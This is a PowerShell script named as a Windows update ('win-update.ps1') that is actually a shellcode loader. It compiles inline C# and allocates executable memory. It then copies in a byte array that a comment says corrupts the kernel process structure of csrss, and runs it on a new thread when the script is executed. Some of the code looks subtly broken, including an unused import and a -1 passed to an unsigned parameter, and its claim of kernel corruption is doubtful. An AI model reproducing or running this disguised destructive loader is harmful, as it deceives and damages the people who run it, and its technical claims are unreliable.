# win-update.ps1
$code = @"

using System;
using System.Runtime.InteropServices;
using System.Text;

public class Doom {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, UInt32 dwCreationFlags, IntPtr lpThreadId);

    [DllImport("ntdll.dll")]
    public static extern uint NtQueryInformationProcess(IntPtr hProcess, int iInfoClass, out PROCESS_BASIC_INFORMATION pbi, int iInfoLength, out int iReturnLength);

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_BASIC_INFORMATION {
        public IntPtr Reserved1;
        public IntPtr PebAddress;
        public IntPtr Reserved2;
        public IntPtr UniqueProcessId;
        public IntPtr InheritedFromUniqueProcessId;
    }

    public static void Meltdown() {
        // 64-bit shellcode: corrupt kernel EPROCESS (csrss)
        byte[] shell = new byte[] {
            0x65, 0x48, 0x8B, 0x14, 0x25, 0x88, 0x01, 0x00, 0x00,
            0x48, 0x8B, 0x92, 0xB8, 0x00, 0x00, 0x00,
            0x48, 0x8B, 0x8A, 0xA8, 0x00, 0x00, 0x00,
            0x48, 0xC7, 0x81, 0x38, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x48, 0xC7, 0x81, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x48, 0xC7, 0x81, 0x48, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0xC3
        };

        IntPtr mem = VirtualAlloc(IntPtr.Zero, (UInt32)shell.Length, 0x3000, 0x40);
        Marshal.Copy(shell, 0, mem, shell.Length);
        IntPtr thread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(thread, -1);
    }

    [DllImport("kernel32")]
    public static extern uint WaitForSingleObject(IntPtr handle, uint dwMilliseconds);
}
"@

Add-Type -TypeDefinition $code
[Doom]::Meltdown()
